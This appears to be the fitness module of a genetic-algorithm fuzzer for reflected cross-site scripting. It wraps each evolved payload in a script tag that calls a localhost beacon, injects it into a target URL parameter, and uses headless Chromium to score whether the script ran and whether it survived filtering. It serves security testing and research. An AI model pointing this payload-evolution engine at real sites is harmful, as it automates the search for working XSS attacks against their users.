# src/fitness.py
import uuid
import time
from playwright.sync_api import sync_playwright

from src.send_request import send_payload
from src.fitness_utils import compute_survivability, compute_structure
from src.ga_engine import component_render

def evaluate(ind, url, param):
    payload = component_render(ind)
    token = str(uuid.uuid4())

    beacon = f"http://localhost:5005/beacon?token={token}"
    wrapper = f"<script>fetch('{beacon}')</script>"
    final_payload = wrapper + payload

    # ---- Send to target ----
    html = send_payload(url, param, final_payload)

    executed = False
    injected_url = f"{url}?{param}={final_payload}"

    # ---- Playwright Chromium ----
    with sync_playwright() as p:
        browser = p.chromium.launch(headless=True)
        context = browser.new_context()
        page = context.new_page()

        def on_request(req):
            nonlocal executed
            if token in req.url:
                executed = True

        page.on("request", on_request)

        try:
            page.goto(injected_url, wait_until="load")
        except Exception as e:
            print(f"[!] Page load failed: {e}")

        time.sleep(0.5)
        browser.close()

    # ---- Fitness scores ----
    exec_score = 1.0 if executed else 0.0
    surv = compute_survivability(payload, html)
    struct = compute_structure(payload)

    return (surv, struct, exec_score)
